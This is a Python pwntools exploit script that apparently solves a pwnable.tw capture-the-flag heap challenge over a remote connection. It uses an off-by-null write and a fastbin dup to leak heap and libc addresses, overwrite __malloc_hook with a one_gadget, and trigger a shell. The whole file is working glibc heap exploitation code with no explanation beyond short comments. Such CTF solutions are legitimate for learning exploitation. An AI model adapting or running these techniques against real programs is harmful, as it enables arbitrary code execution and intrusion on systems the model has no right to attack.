from pwn import *

libc = ELF('./libc_64.so.6')

io = remote('chall.pwnable.tw', 10302)

def add(size, name, secret):
    io.recvuntil('Your choice :')
    io.sendline('1')
    io.recvuntil('Size of heart : ')
    io.send(str(size))
    io.recvuntil('Name of heart :')
    io.send(name)
    io.recvuntil('secret of my heart :')
    io.send(secret)

def show(index):
    io.recvuntil('Your choice :')
    io.sendline('2')
    io.recvuntil('Index :')
    io.send(str(index))
    io.recvuntil('Index :')
    index = int(io.recvline(keepends = False))
    io.recvuntil('Size : ')
    size = int(io.recvline(keepends = False))
    io.recvuntil('Name : ')
    name = io.recvline(keepends = False)
    io.recvuntil('Secret : ')
    secret = io.recvline(keepends = False)
    return index, size, name, secret

def delete(index):
    io.recvuntil('Your choice :')
    io.sendline('3')
    io.recvuntil('Index :')
    io.send(str(index))

# leak base heap address
add(0x98, b'A' * 0x20, b'A')
_, _, heap_leak, _ = show(0)
heap_base = u64(heap_leak[0x20:0x26] + b'\0\0') - 0x10
delete(0)

# off by null attack

# bypass P->fd->bk == P && P->bk->fd == P
add(0x98, b'A' * 0x20, p64(0) + p64(0x91) + p64(heap_base + 0x1b8) + p64(heap_base + 0x1c0))
add(0x18, b'A' * 0x20, b'A')
add(0xf8, b'A' * 0x20, b'A')
add(0x18, b'A' * 0x20, p64(heap_base + 0x10))
delete(1)
add(0x18, b'A' * 0x20, b'A' * 0x10 + p64(0xb0)) # off by null
delete(2)

# leak base libc address
add(0x88, b'A' * 0x20, b'\0')
_, _, _, libc_leak = show(1)
libc_base = u64(libc_leak + b'\0\0') - 0x3c3b78

# create two chunks of size 0x70
delete(2)
add(0x18, b'A' * 0x20, b'A')
add(0x68, b'A' * 0x20, b'A')
add(0x68, b'A' * 0x20, b'A')

# fastbin dup
delete(1)
delete(4)
delete(5)

__malloc_hook = libc_base + 0x3c3aed
one_gadget = libc_base + 0xef6c4

# overwrite __malloc_hook with one gadget
add(0x68, b'A' * 0x20, p64(__malloc_hook))
add(0x68, b'A' * 0x20, b'A')
add(0x68, b'A' * 0x20, b'A')
add(0x68, b'A' * 0x20, b'\0' * 0x13 + p64(one_gadget))

# trigger malloc_printerr
delete(1)
delete(5)

io.interactive()
